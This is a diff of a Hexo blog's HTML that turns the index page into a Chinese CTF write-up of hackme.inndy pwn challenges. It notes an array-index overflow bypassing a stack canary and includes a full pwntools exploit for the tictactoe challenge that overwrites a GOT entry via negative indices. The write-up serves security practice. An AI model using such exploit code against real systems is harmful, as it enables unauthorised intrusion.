@@ -81,13 +81,28 @@
 
 
 
-<meta property="og:type" content="website">
+<meta name="description" content="title:hackme.inndy之pwncatflagnc 连接直接get shell  homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe  这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process(&apos;./homework&apos;)p = r">
+<meta property="og:type" content="article">
 <meta property="og:title" content="n0va">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/03/28/hackme.inndy之pwn/index.html">
 <meta property="og:site_name" content="n0va">
+<meta property="og:description" content="title:hackme.inndy之pwncatflagnc 连接直接get shell  homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe  这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process(&apos;./homework&apos;)p = r">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553861402745.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553863968382.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553932573657.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553933512072.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553934410815.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553941551998.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553941657295.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553943748943.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553943571947.png">
+<meta property="og:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553943960873.png">
+<meta property="og:updated_time" content="2019-03-30T11:08:52.423Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="n0va">
+<meta name="twitter:description" content="title:hackme.inndy之pwncatflagnc 连接直接get shell  homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe  这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process(&apos;./homework&apos;)p = r">
+<meta name="twitter:image" content="c:/Users/nova/AppData/Roaming/Typora/typora-user-images/1553861402745.png">
 
 
 
@@ -117,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/03/28/hackme.inndy之pwn/">
 
 
 
 
 
-  <title>n0va</title>
+  <title> | n0va</title>
   
 
 
@@ -142,8 +157,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -278,128 +292,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/29/栈溢出总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="n0va">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="n0va">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/29/栈溢出总结/" itemprop="url">栈溢出总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-29T19:54:16+08:00">
-                2019-03-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
 
   
 
@@ -429,9 +324,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/28/hackme.inndy之pwn/" itemprop="url">未命名</a></h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -481,8 +374,7 @@
       
 
       
-        
-          <hr>
+        <hr>
 <h2 id="title-hackme-inndy之pwn"><a href="#title-hackme-inndy之pwn" class="headerlink" title="title:hackme.inndy之pwn"></a>title:hackme.inndy之pwn</h2><h2 id="catflag"><a href="#catflag" class="headerlink" title="catflag"></a>catflag</h2><p>nc 连接直接get shell </p>
 <h2 id="homeosrk"><a href="#homeosrk" class="headerlink" title="homeosrk"></a>homeosrk</h2><p>数组下标溢出，绕过canary保护直接修改ret地址为后门函数<code>call_me_mabe</code></p>
 <p><img src="C:\Users\nova\AppData\Roaming\Typora\typora-user-images\1553861402745.png" alt="1553861402745"></p>
@@ -570,14 +462,7 @@
 <p><img src="C:\Users\nova\AppData\Roaming\Typora\typora-user-images\1553943960873.png" alt="1553943960873"></p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./tictactoe')</span></span><br><span class="line">p = remote(<span class="string">"hackme.inndy.tw"</span>,<span class="string">"7714"</span>)</span><br><span class="line">puts_got = <span class="number">0x804B024</span></span><br><span class="line"><span class="comment"># -50</span></span><br><span class="line">distance_addr = <span class="number">0x8048C46</span></span><br><span class="line">p.recvuntil(<span class="string">'Play (1)st or (2)nd? '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input move (9 to change flavor): '</span>)</span><br><span class="line">p.sendline(<span class="string">'9'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">'\x46'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input move (9 to change flavor): '</span>)</span><br><span class="line">p.sendline(<span class="string">'-50'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input move (9 to change flavor): '</span>)</span><br><span class="line">p.sendline(<span class="string">'9'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">'\x8c'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input move (9 to change flavor): '</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,"b *0x08048A71")</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="string">'-49'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input move (9 to change flavor): '</span>)</span><br><span class="line">p.sendline(<span class="string">'9'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">'\x04'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input move (9 to change flavor): '</span>)</span><br><span class="line">p.sendline(<span class="string">'-48'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/28/hackme.inndy之pwn/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+<a id="more"></a>
       
     </div>
     
@@ -594,144 +479,32 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/03/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="n0va">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="n0va">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/03/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T16:52:07+08:00">
-                2019-03-03
-              </time>
+              <a href="/2019/03/03/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
+              <a href="/2019/03/29/栈溢出总结/" rel="prev" title="栈溢出总结">
+                栈溢出总结 <i class="fa fa-chevron-right"></i>
+              </a>
             
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a><br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/03/hello-world/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </p></div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -741,10 +514,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -752,6 +526,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -772,8 +550,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -824,6 +611,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#title-hackme-inndy之pwn"><span class="nav-number">1.</span> <span class="nav-text">title:hackme.inndy之pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#catflag"><span class="nav-number">2.</span> <span class="nav-text">catflag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#homeosrk"><span class="nav-number">3.</span> <span class="nav-text">homeosrk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">4.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP2"><span class="nav-number">5.</span> <span class="nav-text">ROP2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#toooomuch"><span class="nav-number">6.</span> <span class="nav-text">toooomuch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#toooomuch-2"><span class="nav-number">7.</span> <span class="nav-text">toooomuch-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#echo"><span class="nav-number">8.</span> <span class="nav-text">echo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#echo2"><span class="nav-number">9.</span> <span class="nav-text">echo2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ehco3"><span class="nav-number">10.</span> <span class="nav-text">ehco3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smash-the-stack"><span class="nav-number">11.</span> <span class="nav-text">smash-the-stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#onepunch"><span class="nav-number">12.</span> <span class="nav-text">onepunch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tictactoe-1"><span class="nav-number">13.</span> <span class="nav-text">tictactoe-1</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -973,6 +776,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
